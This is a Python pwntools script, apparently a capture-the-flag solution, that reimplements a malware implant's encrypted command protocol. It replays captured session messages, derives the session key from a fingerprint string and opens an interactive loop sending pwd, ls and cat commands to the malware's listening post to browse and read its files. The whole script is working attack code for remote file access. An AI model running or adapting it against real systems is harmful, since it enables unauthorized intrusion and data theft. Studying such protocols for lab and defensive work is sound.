#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# This exploit template was generated via:
# $ pwn template --host 127.0.0.1 --port 6666

from pwn import *
import nacl.secret
import hashlib
import struct

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py HOST=example.com PORT=4141
host = args.HOST or '127.0.0.1'
port = int(args.PORT or 6666)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    return remote(argv, *a, **kw)

MAGIC_START = b'\x18\x15\xe9\xd3'
MAGIC_END = b'\xef\x5a\x80\xcb'
RESPONSE_CODE_LENGTH = 4

COMMANDS = {
    1: "COMMAND_ONE",
    2: "COMMAND_INIT",
    3: "COMMAND_PWD", # guess from sayre session
    4: "COMMAND_LS", # guess
    5: "COMMAND_CAT", # guess
    6: "COMMAND_UPLOAD",
    7: "COMMAND_FIN",
}

PARAMS = {
    0x1100: "PARAM_CMD",
    0x1108: "PARAM_UUID",
    0x1114: "PARAM_DIRNAME",
    0x1118: "PARAM_DIRLIST", # guess from sayre session
    0x111c: "PARAM_FILENAME",
    0x1120: "PARAM_CONTENTS",
    0x1124: "PARAM_MORE",
    0x1128: "PARAM_CODE",
}

# make inverse dictionaries that make it easier to build commands
# https://stackoverflow.com/a/2569074/15117449
C = {v: k for k, v in COMMANDS.items()}
P = {v: k for k, v in PARAMS.items()}

# init session and start command loop
def main():
    init()

    while True:
        command = input("> ").strip().split(' ')

        cmd = command[0]
        args = command[1:]
        if cmd == 'ls':
            cmd_ls(args)
        elif cmd == 'pwd':
            cmd_pwd(args)
        elif cmd == 'cat':
            cmd_cat(args)

def keygen(fp):
    h = hashlib.sha256()
    h.update(fp.encode())
    return h.digest()

def decrypt(ciphertext, nonce, key):
    box = nacl.secret.SecretBox(key)
    return box.decrypt(nonce + ciphertext)

# length header algorithms derived from lengthHeader() in malicious 'make' binary
def get_length(header):
    s1, s2 = struct.unpack('!HH', header)
    return (s1 + s2) % 0x10000

def make_header(length):
    s2 = length % 0x10000
    return struct.pack('!HH', 0, s2)

# send client public key, fingerprint, and init message to LP
# copied from root session, not bothering to decrypt
def init():
    pubkey_message = bytes.fromhex('20d2a187ac369b6b4392360b97964a8c556830238976b988a8cb35b21d6c7618')
    fingerprint_message = bytes.fromhex('7d6f8318609692052338cca775d1be756f7dea94df002bc438420f915e29a90aa409697a4ea145a269619a5d5d014c844871ebda5d8b80be0f2aca07cdad2dee5caf6c8bc83b50a66364cf29b14e8a219a85975342ef8c463a91f11219ddb0bd0d2004df12234749496cd890a5186d7c699ceadecf019905431fef999c3254a8ab1dd7ed5dd2141878eacf')
    init_message = bytes.fromhex('30ebcf5f20a6d7d06d31c233560d18f13330be17ff8e896c5d61fde2644345cc997c9c627494423b042d545bf6f102a7f10f9b5856c83f49553d1a9cd0661c0d56b435459b046e571f488321f56c')

    io.send(pubkey_message)
    io.send(fingerprint_message)
    io.send(init_message)

    recv_message()

# receive, decrypt, and parse message from LP
def recv_message():
    # get length header
    length = get_length(io.recvn(4))

    # read entire message based on length
    n = io.recvn(24)
    c = io.recvn(length - 24)

    length -= (16 + 24)

    pt = decrypt(c, n, key)

    # start parsing
    start = pt[:4] == MAGIC_START

    p = 4
    while p <= length:
        param = int.from_bytes(pt[p:p + 2], 'big')
        # get param
        param = int.from_bytes(pt[p:p + 2], 'big')
        if param in PARAMS:
            param_string = PARAMS[param]
        else:
            param_string = f"UNKNOWN ({pt[p:p + 2]})"
        p += 2

        # get param length
        param_length = int.from_bytes(pt[p:p + 2], 'big')
        p += 2

        # get param data
        param_data = int.from_bytes(pt[p:p + param_length], 'big')
        if param_data in COMMANDS:
            data_string = COMMANDS[param_data]
        else:
            data_string = pt[p:p + param_length]
        p += param_length

        print(data_string.decode())

        # leave 4 bytes at the end for MAGIC_END
        if p == length - 4:
            break

    end = pt[-4:] == MAGIC_END

# encrypt and send message to LP
def send_message(data, name):
    box = nacl.secret.SecretBox(key)
    encrypted_message = box.encrypt(data)

    header = make_header(len(encrypted_message))

    payload = header + encrypted_message

    io.send(payload)

# build command from arguments
def build_command(command, *params):
    data = MAGIC_START

    data += p16(P['PARAM_CMD'], endian='big')
    data += p16(2, endian='big')
    data += p16(command, endian='big')

    # https://stackoverflow.com/a/5389578/15117449 
    for param, arg in zip(params[0::2], params[1::2]):
        data += p16(param, endian='big')
        data += p16(len(arg), endian='big')
        data += arg

    data += MAGIC_END

    return data

def cmd_pwd(args):
    command = build_command(C['COMMAND_PWD'], P['PARAM_UUID'], uuid)

    send_message(command, "PWD")
    recv_message()
        
def cmd_ls(args):
    if len(args) == 0:
        args.append('.')
        
    directory = args[0].encode() + b'\x00'

    command = build_command(C['COMMAND_LS'], P['PARAM_UUID'], uuid, P['PARAM_DIRNAME'], directory)

    send_message(command, "LS")
    recv_message()

def cmd_cat(args):
    path = args[0]
    dname = '/'.join(path.split('/')[:-1]).encode() + b'\x00'
    fname = path.split('/')[-1].encode() + b'\x00'

    command = build_command(C['COMMAND_CAT'], P['PARAM_UUID'], uuid, P['PARAM_DIRNAME'], dname, P['PARAM_FILENAME'], fname)

    send_message(command, "CAT")
    recv_message()

if __name__ == "__main__":
    # connect to LP
    io = start()

    # prepare key and session uuid
    key =  keygen('root+1.2.2.0+1615897678')
    uuid = bytes.fromhex('b6c5957f42ff473a85e29289477c1209')

    # start command loop
    main()
